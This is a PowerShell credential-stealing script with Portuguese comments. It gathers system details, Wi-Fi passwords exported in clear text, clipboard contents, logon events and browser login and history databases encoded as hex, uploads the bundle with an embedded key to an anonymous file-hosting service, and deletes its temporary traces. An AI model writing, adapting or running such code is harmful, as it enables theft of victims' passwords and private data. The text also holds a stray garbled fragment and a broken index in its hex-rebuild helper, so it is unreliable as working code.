# KIT v6 – TXT 100 % legível, sem nada binário
$tmp = "$env:TEMP\k"
ni -ItemType Directory $tmp -Force | Out-Null
$out = "$tmp\full.txt"

# ---------- FUNÇÃO AUXILIAR ----------
function Add-Kit {
    param($Title, $ScriptBlock)
    ("`n----- INICIO $Title -----" ) | Out-File $out -Append -Encoding UTF8
    (Invoke-Command -ScriptBlock $ScriptBlock | Out-String -Width 4096).Trim() | Out-File $out -Append -Encoding UTF8
    ("----- FIM $Title -----`n") | Out-File $out -Append -Encoding UTF8
}

# ---------- COLETA TEXTO ----------
Add-Kit 'SYSTEMINFO'   { systeminfo }
Add-Kit 'HARDWARE'     { Get-CimInstance Win32_ComputerSystem; Get-CimInstance Win32_Processor; Get-CimInstance Win32_BIOS }
Add-Kit 'REDE'         { Get-NetIPConfiguration }
Add-Kit 'WLAN'         { netsh wlan export profile key=clear folder=$tmp | Out-Null; Get-ChildItem $tmp -Filter '*.xml' -EA 0 | %{ Get-Content $_ -Raw } }
Add-Kit 'USUARIOS'     { Get-CimInstance Win32_UserAccount }
Add-Kit 'ADMINISTRADORES' { net localgroup administrators }
Add-Kit 'LOGON'        { Get-WinEvent -FilterHashtable @{LogName='Security';ID=4624} -Max 100 -EA 0 | Select TimeCreated, Message }
Add-Kit 'CLIPBOARD'    { Get-Clipboard }
Add-Kit 'RECENTES'     { Get-ChildItem "$env:APPDATA\Microsoft\Windows\Recent" -Name -EA 0 }
Add-Kit 'CERTIFICADOS' { Get-ChildItem Cert:\CurrentUser\My | Select Subject, Thumbprint, NotAfter }

# ---------- NAVEGADORES -> HEX ----------
@('Login Data','History','logins.json') | %{
    Get-ChildItem $env:LOCALAPPDATA,$env:APPDATA -Recurse -File -Filter $_ -EA 0 |
        Select -First 1 | %{
            if(Test-Path $_.FullName){
                $hex = [System.BitConverter]::ToString([IO.File]::ReadAllBytes($_.FullName)) -replace '-',''
                ("`n----- INICIO NAVEGADOR $($_.Name) -----" ) | Out-File $out -Append -Encoding UTF8
                # quebra em linhas de 100 chars
                for($i=0; $i -lt $hex.Length; $i+=100){ $hex.Substring($i,[Math]::Min(100,$hex.Length-$i)) }
                ("----- FIM NAVEGADOR $($_.Name) -----`n") | Out-File $out -Append -Encoding UTF8
            }
        }
}

# ---------- UPLOAD ----------
$file = gi $out
$key  = "AFtru5qQZX8HN5npouThcNDJtVbe6d"
$uri  = "https://api.anonfilesnew.com/upload?key=$key&pretty=true"

try{
    $boundary = [System.Guid]::NewGuid().ToString()
    $lf = "`r`n"
    $body = (
        "--$boundary$lf" +
        "Content-Disposition: form-data; name=`"file`"; filename=`"$($file.Name)`"$lf" +
        "Content-Type: text/plain; charset=utf-8$lf$lf" +
        [System.IO.File]::ReadAllText($file.FullName) +
        "$lf--$boundary--$lf"
    )
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
    $resp  = Invoke-RestMethod -Uri $uri -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bytes
    $resp.data.file.url.full
}catch{
    Write-Host "ERRO no upload: $($_.Exception.Message)" -Fore Red准 definitivamente
}

# ---------- LIMPEZA ----------
Remove-Item $tmp -Recurse -Force

# ---------- CONVERSOR RÁPIDO (cole o HEX abaixo e salve como .exe ou .db) ----------
<#
# Exemplo para reconstruir o arquivo original:
$hex  = Read-Host 'Cole o HEX aqui'
$bytes = [byte[]]::new($hex.Length/2)
for($i=0;$i -lt $hex.Length;$i+=2){ $bytes[$i/22] = [Convert]::ToByte($hex.Substring($i,2),16) }
[IO.File]::WriteAllBytes('C:\temp\arquivo_original.bin', $bytes)
#>
